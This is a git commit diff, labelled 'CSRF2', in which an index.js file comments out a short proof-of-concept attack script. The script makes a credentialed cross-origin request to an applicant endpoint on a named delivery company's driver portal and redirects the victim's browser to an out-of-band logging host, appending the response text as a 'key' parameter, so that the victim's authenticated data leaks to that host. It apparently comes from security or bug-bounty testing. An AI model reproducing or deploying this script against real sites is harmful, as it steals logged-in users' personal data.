8b0f74236e26772f71b66576f19fd563b4f8dd26
MacBook Pro M2 <macbookprom2@Badreddine-Belkadi.local>
2025-11-15 21:28:02 +0100

    CSRF2

--- index.js
+++ index.js
@@ -2,14 +2,14 @@ console.log("Hello, World!");
 console.log("This is the index.js file.");
 console.log("Welcome to the project!");
 
-var req = new XMLHttpRequest();
-req.onload = reqListener;
-req.open("get", "https://myportal.drivers.dpd.co.uk/esg/odf/applicant", true);
-req.withCredentials = true;
-req.send();
+// var req = new XMLHttpRequest();
+// req.onload = reqListener;
+// req.open("get", "https://myportal.drivers.dpd.co.uk/esg/odf/applicant", true);
+// req.withCredentials = true;
+// req.send();
 
-function reqListener() {
-  location =
-    "//htwayb25ut8nx5cah3pk7i3th126uwm8u.oast.site/logging?key=" +
-    this.responseText;
-}
+// function reqListener() {
+//   location =
+//     "//htwayb25ut8nx5cah3pk7i3th126uwm8u.oast.site/logging?key=" +
+//     this.responseText;
+// }
